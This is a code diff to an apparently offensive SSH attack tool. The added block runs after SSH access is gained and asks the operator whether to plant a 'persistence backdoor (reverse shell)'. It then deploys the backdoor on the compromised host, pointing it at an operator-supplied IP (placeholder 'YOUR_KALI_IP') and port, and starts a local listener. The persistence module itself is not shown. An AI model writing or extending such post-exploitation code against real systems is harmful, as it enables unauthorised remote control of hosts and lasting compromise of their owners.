@@ -31,6 +31,19 @@ class SSHEngine:
                                 f.write(f"[{cmd}]:\n{output}\n\n")
                             except: pass
                     
+                    # Ask user about persistence
+                    choice = input("\n[?] SSH Access gained. Do you want to deploy a persistence backdoor (reverse shell)? (y/n): ").strip().lower()
+                    if choice == 'y':
+                        from engines.persistence import PersistenceAgent
+                        agent = PersistenceAgent(self.target_ip, self.port)
+                        listener_port = input("[?] Enter local port to listen on (e.g., 4444): ").strip()
+                        if listener_port.isdigit():
+                            listener_ip = "YOUR_KALI_IP" # Better to extract local IP, but we can ask or leave as placeholder
+                            local_ip_choice = input("[?] Enter your local IP for the reverse shell to connect to: ").strip()
+                            if local_ip_choice:
+                                agent.deploy_backdoor_ssh(client, local_ip_choice, listener_port)
+                                agent.start_listener(listener_port)
+                    
                     client.close()
                     return True
                 except paramiko.AuthenticationException:
